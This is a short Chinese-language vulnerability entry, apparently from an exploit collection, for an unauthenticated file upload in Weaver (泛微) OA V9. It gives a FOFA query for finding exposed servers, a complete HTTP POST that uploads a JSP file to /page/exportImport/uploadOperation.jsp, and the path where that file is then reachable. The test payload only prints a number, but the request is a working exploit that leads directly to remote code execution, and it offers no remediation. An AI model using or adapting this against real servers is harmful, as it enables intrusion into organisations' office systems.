# 泛微OA V9 前台文件上传

## 漏洞描述

漏洞位于: `/page/exportImport/uploadOperation.jsp`文件中

## FOFA

```
app="Weaver-OA"
```

## 漏洞POC

```
POST /page/exportImport/uploadOperation.jsp HTTP/1.1
Host: x.x.x.x
Content-Length: 216
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://x.x.x.x/
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo
Connection: close

------WebKitFormBoundaryFy3iNVBftjP6IOwo
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: application/octet-stream

<%out.print(1111);%>
------WebKitFormBoundaryFy3iNVBftjP6IOwo--
```

访问：

```
page/exportImport/fileTransfer/1.jsp
```

